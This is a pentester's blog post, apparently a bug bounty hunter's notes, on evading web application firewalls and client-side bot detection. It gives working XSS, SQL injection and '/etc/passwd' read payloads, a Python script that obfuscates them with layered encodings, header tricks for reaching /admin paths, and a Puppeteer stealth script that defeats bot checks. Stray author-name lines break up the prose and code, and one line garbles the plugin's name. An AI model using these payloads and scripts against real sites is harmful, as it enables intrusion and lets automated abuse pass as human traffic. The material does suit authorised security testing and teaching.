@@ -1,0 +1,281 @@
+---
+title: modern web defense analysis
+description: ''
+date: '2026-07-01'
+author: overlord
+tags: []
+draft: false
+---
+
+Bypassing Bot Protection and WAFs: Stuff I Actually Use
+
+vantyx  |  May 2026
+
+I do a lot of bug bounty work and pentesting on the side, mostly on web apps. I've been meaning to write down the stuff i actually reach for when i'm testing because every time i look up "WAF bypass" on Google i get the same 10 blog posts from 2019 that all copy each other. So this is my version. Real stuff, things that have actually worked for me recently, plus two scripts i built that save me a ton of time.
+
+I work with all kinds of stacks in my day job. Next.js on Vercel, a bunch of React stuff, some Python backends, the usual. And honestly a lot of what i know about bypassing protections comes from deploying apps myself and seeing where the gaps are. When you've set up Cloudflare on your own Vercel project and watched it flag your own API calls as bots, you start to understand how these systems actually think.
+
+the WAF stuff
+
+WAFs are basically just big lists of regex patterns. That's the dirty secret nobody wants to admit. Even the fancy cloud ones with "machine learning" and "behavioral analysis" still fall back on signature matching for the vast majority of requests. They check your input against known attack patterns and if something matches, you get blocked.
+
+The problem is regex is incredibly easy to trick. Like actually, embarrassingly easy. You can mix uppercase and lowercase letters, throw in random whitespace, use different encodings, inject comments inside function calls. The WAF sees something completely different from what the backend server processes, and that gap is basically the entire game.
+
+Normalization differences are another big one. The WAF might decode a URL-encoded string once, but the backend decodes it twice. So you double-encode something and the WAF says looks fine but the server unpacks it into your actual payload. Or the WAF doesn't handle Unicode the same way PHP does, or whatever language the backend is running. It's boring but it works constantly.
+
+One thing that took me way too long to learn is that a lot of WAFs just stop trying if the request is big enough. I'm not even kidding. If you pad your payload with a bunch of garbage so the body is like 2KB instead of 200 bytes, some cloud WAFs just give up and let it through. Something about inspection thresholds. It's stupid but i've used it in real bug bounties so whatever.
+
+techniques that actually work
+
+These are the ones i keep going back to. Not an exhaustive list, just the stuff that's landed 
+
+vantyx
+
+for me multiple times:
+
+•  Case mixing. sCrIpT instead of script. Stupid simple but it breaks so many regex rules.
+
+•  Encoding layers. URL encode, double encode, Unicode escapes, HTML entities. Stack them together.
+
+•  Comment injection. /**/ inside SQL keywords like un/**/ion sel/**/ect. Works on more WAFs than you'd think.
+
+•  Junk characters. +, !, ~, tabs, newlines. Languages like PHP and JS just ignore them but WAFs choke.
+
+•  Parameter pollution. Send the same parameter multiple times. Sometimes the WAF checks one copy and the backend uses a different one.
+
+•  Header spoofing. X-Forwarded-For: 127.0.0.1. Makes it look like internal traffic. Doesn't always work but when it does it's funny.
+
+the python obfuscator
+
+I got sick of doing all this by hand in Burp so i wrote a quick script. You give it a payload and it spits out a bunch of obfuscated versions using random combinations of the techniques above. Every run is different because of the random sampling so you can just keep firing it until something sticks.
+
+```
+#!/usr/bin/env python3
+# waf_bypass.py
+import urllib.parse
+import random
+
+def case_toggle(s):
+    out = ""
+    for ch in s:
+        if random.random() > 0.5:
+            out += ch.upper()
+        else:
+            out += ch.lower()
+    return out
+
+def add_junk(s):
+    junk_chars = ['+', '-', '!', '~', ' ', '/**/']
+    for i in range(random.randint(2,5)):
+        spot = random.randint(0, len(s))
+        s = s[:spot] + random.choice(junk_chars) + s[spot:]
+    return s
+
+def url_enc(s, dbl=False):
+    enc = urllib.parse.quote_plus(s)
+    if dbl:
+
+vantyx
+
+
+        enc = urllib.parse.quote_plus(enc)
+    return enc
+
+def uni_esc(s):
+    res = ""
+    for ch in s:
+        if random.random() > 0.6 and ch.isalpha():
+            res += "\\u%04x" % ord(ch)
+        else:
+            res += ch
+    return res
+
+def inject_comments(s):
+    if "script" in s.lower():
+        s = s.replace("(", "/**/(")
+        s = s.replace(")", "/**/)")
+    if "union" in s.lower():
+        s = s.replace("union", "un/**/ion")
+        s = s.replace("select", "sel/**/ect")
+    return s
+
+funcs = [case_toggle, add_junk, url_enc,
+         lambda x: url_enc(x, True), uni_esc,
+         inject_comments,
+         lambda x: x.replace('<', '%3C').replace('>', '%3E')]
+
+def run(payload, num=6):
+    print("original: " + payload)
+    for i in range(num):
+        p = payload
+        picks = random.sample(funcs, random.randint(2,4))
+        for f in picks:
+            p = f(p)
+        print("v" + str(i+1) + ": " + p)
+    print()
+
+if __name__ == "__main__":
+    run("<script>alert(1)</script>", 6)
+    run("1' UNION SELECT 1,2,3--", 5)
+    run("/bin/cat /etc/passwd", 4)
+```
+
+Just run it with python3 and swap the payloads at the bottom for whatever you're testing. I've been thinking about adding IBM037 encoding and null bytes but honestly this covers like 80% of what i need on a given day.
+
+quick manual ones
+
+vantyx
+
+Some stuff i don't even need the script for:
+
+```
+<ScRiPt>+-+-alert(1)-+-+</sCrIpT>
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+<scri%00pt>alert(1)</scri%00pt>
+```
+
+And those headers i mentioned:
+
+```
+X-Forwarded-For: 127.0.0.1
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+```
+
+The X-Original-URL and X-Rewrite-URL ones are underrated. Some WAFs only check the main URL path but certain reverse proxies (including some Vercel configs) will rewrite the path from those headers. So the WAF sees / and the backend sees /admin. Pretty cool when it works.
+
+the bot detection problem
+
+Ok so WAF bypasses are one thing but lately i've been running into a different problem entirely. A lot of apps now use client-side bot detection, stuff like BotID, Cloudflare Turnstile, DataDome, PerimeterX. These aren't checking your payload, they're checking whether your browser is a real browser or an automated script. And that's a completely different game.
+
+The way these work is they inject a JavaScript challenge into the page that collects browser fingerprints. Things like canvas rendering, WebGL info, navigator properties, mouse movements, timing data. All this gets bundled into a token that gets sent with every request. If the token is missing or looks fake, you get blocked before your payload even reaches the backend.
+
+This is annoying because you can't just obfuscate your way around it. The protection isn't looking at what you're sending, it's looking at who's sending it. Which means you need a real browser environment that can solve the challenge and generate a valid token.
+
+I ran into this hard recently. I was testing an API and no matter what i did, every request came back 403. Turned out the site was using BotID and it was catching my requests because there was no valid bot detection token in the cookies. The API itself had no WAF, it was purely the bot protection blocking everything.
+
+the puppeteer bypass
+
+So i built a little node script that uses puppeteer with the stealth plugin to get around this. The idea is simple: launch a real browser, load the page so the bot detection scripts run and generate a token, then make your API calls from inside that browser context. The token is already in the cookies so everything just works.
+
+I use this all the time now. It's saved me hours of messing around with token extraction and 
+
+vantyx
+
+header copying. You just point it at whatever target you're testing and it handles the rest.
+
+```
+const puppeteer = require('puppeteer-extra');
+const StealthPlugin = require('puppeteer-extra-plugin-stealth');
+puppeteer.use(StealthPlugin());
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+(async () => {
+    // change these to whatever ur testing
+    const TARGET_URL = process.argv[2] || "https://example.com/login";
+    const API_ENDPOINT = process.argv[3] || "/api/status";
+
+    const browser = await puppeteer.launch({
+        headless: false,
+        args: [
+            '--no-sandbox',
+            '--disable-blink-features=AutomationControlled',
+        ]
+    });
+
+    const page = await browser.newPage();
+    await page.setViewport({ width: 1920, height: 1080 });
+
+    // hide webdriver flag
+    await page.evaluateOnNewDocument(() => {
+        Object.defineProperty(navigator, 'webdriver', {
+            get: () => false
+        });
+    });
+
+    console.log('[*] loading ' + TARGET_URL);
+    await page.goto(TARGET_URL, {
+        waitUntil: 'networkidle0',
+        timeout: 30000
+    });
+
+    // wait for bot protection scripts to do their thing
+    // might need to tweak this depending on the target
+    console.log('[*] waiting 5s for bot detection to initialize...');
+    await sleep(5000);
+
+    // now make the api call from within the browser context
+    // cookies/tokens are already set
+    console.log('[*] calling ' + API_ENDPOINT);
+    const result = await page.evaluate(async (endpoint) => {
+        try {
+            const resp = await fetch(endpoint, {
+                headers: { 'Accept': '*/*' }
+
+vantyx
+
+
+            });
+            return {
+                status: resp.status,
+                body: await resp.text()
+            };
+        } catch (e) {
+            return { error: e.message };
+        }
+    }, API_ENDPOINT);
+
+    console.log('[+] status: ' + result.status);
+    console.log('[+] response: ' + result.body);
+
+    await browser.close();
+    console.log('[*] done');
+})();
+```
+
+To set it up, run npm install puppeteer puppeteer-extra puppeteer-extra-plugin-stealth and then pass the target URL and API endpoint as arguments:
+
+```
+node bypass.js "https://target.com/login" "/api/users"
+```
+
+The stealth plugin `http_code` does most of the heavy lifting. It patches a bunch of browser properties that bot detection scripts look for, things like navigator.plugins, chrome.runtime, permissions API, and a bunch of other stuff that puppeteer leaks by default. Without it, pretty much every bot detection system will catch you immediately.
+
+The key insight is that you're not trying to fake the token. You're letting the real browser generate a real token by actually running the bot detection JavaScript, and then making your API calls from that same browser context where the token is valid. It's not a bypass in the traditional sense, more like... using the system as intended but from an automated browser.
+
+I've tested this against BotID, Cloudflare, and a couple others and it works most of the time. Sometimes you need to adjust the sleep timer at the beginning because some bot detection systems take longer to initialize. I've seen some that need like 8-10 seconds before the token is ready. Just trial and error.
+
+vercel specific stuff
+
+Since i deploy a lot of stuff on Vercel i've run into some weird edge cases worth mentioning. Vercel's edge network has its own WAF layer and it behaves a bit differently from Cloudflare or AWS WAF.
+
+One thing that's caught me out a few times is that Vercel will sometimes block requests based on the Host header. If you're testing a Vercel deployment and sending requests directly to the edge function URL instead of through the custom domain, you might get 
+
+vantyx
+
+blocked. The fix is just to set the Host header to the actual domain.
+
+```
+Host: your-app.vercel.app
+```
+
+Another one: Vercel's WAF is pretty aggressive with SQL injection patterns but weirdly lenient on XSS. I'm not sure why. Maybe because their edge functions are mostly serving API responses and they figure XSS is a client-side problem. Either way, if you're testing a Vercel app and your SQLi payloads keep getting blocked, try encoding them differently. Double URL encoding works surprisingly well here.
+
+Also if you're running Next.js API routes on Vercel, the middleware runs before your route handlers. So if there's any bot detection or rate limiting in the middleware layer, you need to deal with that separately from whatever WAF Vercel has. I've seen apps where the Vercel WAF lets everything through but the custom middleware blocks it. Just something to keep in mind.
+
+random tips that saved my ass
+
+Test everything in Burp Repeater first. Seriously. Don't just throw payloads at a target and hope. Repeater lets you tweak things instantly and see exactly what changes in the response. I probably use Repeater more than any other tool.
+
+Stack techniques. One trick almost never works on its own anymore. But combine like three of them together and you'd be surprised. Double encoding plus case mixing plus comment injection has gotten me through WAFs that blocked every individual technique.
+
+Use wafw00f to fingerprint what you're dealing with. It's not always accurate but it gives you a starting point. Once you know the WAF vendor you can look up specific bypasses instead of guessing blindly.
+
+Payload size actually matters. I mentioned this already but it's worth repeating because it's so counterintuitive. Bigger payloads sometimes bypass inspection entirely. Add some padding and see what happens.
+
+For bot detection specifically, try the stealth puppeteer approach before you try anything else. A lot of people jump straight to reverse engineering the token generation but that's way more work than necessary. If the browser can generate a valid token, just use the browser.
+
+disclaimer
+
+Only test on stuff you have permission to test. Bug bounty programs, authorized pentests, your own apps. If you use any of this against targets you don't have authorization for that's entirely on you and it's illegal. Don't be dumb.
